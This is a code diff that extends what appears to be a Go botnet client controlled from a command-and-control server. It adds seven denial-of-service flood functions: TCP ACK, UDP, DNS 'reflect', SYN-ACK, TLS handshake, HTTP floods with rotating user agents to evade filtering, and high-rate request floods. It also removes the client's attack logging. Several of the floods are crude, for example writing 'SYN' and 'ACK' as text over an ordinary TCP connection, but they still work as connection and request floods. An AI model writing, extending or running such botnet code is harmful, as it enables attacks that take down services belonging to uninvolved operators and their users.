@@ -19,7 +19,7 @@ import (
 )
 
 const (
-	serverAddr    = "Proxy/C2_IP:7003"
+	serverAddr    = "C2_PROXYIP:7002"
 	pingInterval  = 7 * time.Second
 	statsInterval = 7 * time.Second
 )
@@ -51,6 +51,13 @@ var (
 	processStartTime = time.Now()
 	lastCommandTime  = time.Now()
 	totalAttackCount = 0
+	userAgents       = []string{
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
+		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+		"Googlebot/2.1 (+http://www.google.com/bot.html)",
+		"curl/7.68.0",
+	}
 )
 
 func formatHostPort(host, port string) string {
@@ -372,8 +379,7 @@ func handleCommand(_ net.Conn, command string) {
 }
 
 func executeAttack(method, target, port string, duration int) {
-	startTime := time.Now()
-	logInfo("Attack", fmt.Sprintf("Starting %s attack on %s:%s", method, target, port))
+	_ = time.Now()
 
 	switch method {
 	case "!udpflood":
@@ -400,13 +406,23 @@ func executeAttack(method, target, port string, duration int) {
 		memcached(target, port, duration)
 	case "!ntp":
 		ntpAmplification(target, port, duration)
+	case "!tcpack":
+		tcpAckFlood(target, port, duration)
+	case "!udplag":
+		udpLag(target, port, duration)
+	case "!dnsreflect":
+		dnsReflect(target, port, duration)
+	case "!synack":
+		synAckFlood(target, port, duration)
+	case "!tlsflood":
+		tlsFlood(target, port, duration)
+	case "!httpsbypass":
+		httpsBypass(target, port, duration)
+	case "!highrps":
+		highRps(target, port, duration)
 	default:
-		logError("Attack", fmt.Sprintf("Unknown attack method: %s", method))
 		return
 	}
-
-	logSuccess("Attack", fmt.Sprintf("Completed %s attack on %s:%s (Duration: %s)",
-		method, target, port, time.Since(startTime)))
 }
 
 func encryptMessage(msg string) string {
@@ -416,7 +432,7 @@ func encryptMessage(msg string) string {
 func decryptMessage(msg string) string {
 	decoded, err := hex.DecodeString(msg)
 	if err != nil {
-		return msg // Fallback to original if not hex
+		return msg
 	}
 	return string(decoded)
 }
@@ -604,4 +620,145 @@ func ntpAmplification(target, port string, duration int) {
 		}()
 		time.Sleep(1 * time.Millisecond)
 	}
+}
+
+func tcpAckFlood(target, port string, duration int) {
+	dst := formatHostPort(target, port)
+	timeout := time.Now().Add(time.Duration(duration) * time.Second)
+	for time.Now().Before(timeout) {
+		go func() {
+			conn, err := net.Dial("tcp", dst)
+			if err != nil {
+				return
+			}
+			conn.Write([]byte(fmt.Sprintf("ACK %d\r\n", rand.Intn(1000000))))
+			conn.Close()
+		}()
+		time.Sleep(1 * time.Millisecond)
+	}
+}
+
+func udpLag(target, port string, duration int) {
+	dst := formatHostPort(target, port)
+	timeout := time.Now().Add(time.Duration(duration) * time.Second)
+	for time.Now().Before(timeout) {
+		go func() {
+			conn, err := net.Dial("udp", dst)
+			if err != nil {
+				return
+			}
+			payload := make([]byte, 500+rand.Intn(500))
+			rand.Read(payload)
+			payload[8] = 0xFF
+			payload[9] = 0xFF
+			conn.Write(payload)
+			conn.Close()
+		}()
+		time.Sleep(1 * time.Millisecond)
+	}
+}
+
+func dnsReflect(target, port string, duration int) {
+	dst := formatHostPort(target, port)
+	timeout := time.Now().Add(time.Duration(duration) * time.Second)
+	domains := []string{"example.com", "google.com", "cloudflare.com", "amazon.com"}
+
+	for time.Now().Before(timeout) {
+		go func() {
+			conn, err := net.Dial("udp", dst)
+			if err != nil {
+				return
+			}
+			query := fmt.Sprintf("%s ANY %s", randStr(10), domains[rand.Intn(len(domains))])
+			conn.Write([]byte(query))
+			conn.Close()
+		}()
+		time.Sleep(1 * time.Millisecond)
+	}
+}
+
+func synAckFlood(target, port string, duration int) {
+	dst := formatHostPort(target, port)
+	timeout := time.Now().Add(time.Duration(duration) * time.Second)
+	for time.Now().Before(timeout) {
+		go func() {
+			conn, err := net.Dial("tcp", dst)
+			if err != nil {
+				return
+			}
+			conn.Write([]byte(fmt.Sprintf("SYN %d\r\nACK %d\r\n", rand.Intn(1000000), rand.Intn(1000000))))
+			conn.Close()
+		}()
+		time.Sleep(1 * time.Millisecond)
+	}
+}
+
+func tlsFlood(target, port string, duration int) {
+	dst := formatHostPort(target, port)
+	timeout := time.Now().Add(time.Duration(duration) * time.Second)
+	for time.Now().Before(timeout) {
+		go func() {
+			conf := &tls.Config{
+				InsecureSkipVerify: true,
+				MinVersion:         tls.VersionTLS12,
+				MaxVersion:         tls.VersionTLS13,
+				ServerName:         target,
+			}
+			conn, err := tls.Dial("tcp", dst, conf)
+			if err != nil {
+				return
+			}
+			conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"))
+			conn.Close()
+		}()
+		time.Sleep(1 * time.Millisecond)
+	}
+}
+
+func httpsBypass(target, port string, duration int) {
+	dst := formatHostPort(target, port)
+	timeout := time.Now().Add(time.Duration(duration) * time.Second)
+	paths := []string{"/", "/api/v1", "/wp-admin", "/admin", "/static/js/main.js"}
+
+	for time.Now().Before(timeout) {
+		go func() {
+			conn, err := net.Dial("tcp", dst)
+			if err != nil {
+				return
+			}
+			ua := userAgents[rand.Intn(len(userAgents))]
+			path := paths[rand.Intn(len(paths))]
+			req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n", path, target, ua)
+			conn.Write([]byte(req))
+			conn.Close()
+		}()
+		time.Sleep(1 * time.Millisecond)
+	}
+}
+
+func highRps(target, port string, duration int) {
+	dst := formatHostPort(target, port)
+	timeout := time.Now().Add(time.Duration(duration) * time.Second)
+	for time.Now().Before(timeout) {
+		go func() {
+			conn, err := net.Dial("tcp", dst)
+			if err != nil {
+				return
+			}
+			for i := 0; i < 100; i++ {
+				conn.Write([]byte(fmt.Sprintf("GET /%d HTTP/1.1\r\nHost: %s\r\n\r\n", i, target)))
+			}
+			conn.Close()
+		}()
+		time.Sleep(1 * time.Millisecond)
+	}
+}
+
+func randStr(n int) string {
+	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = letters[rand.Intn(len(letters))]
+	}
+	return string(b)
 }
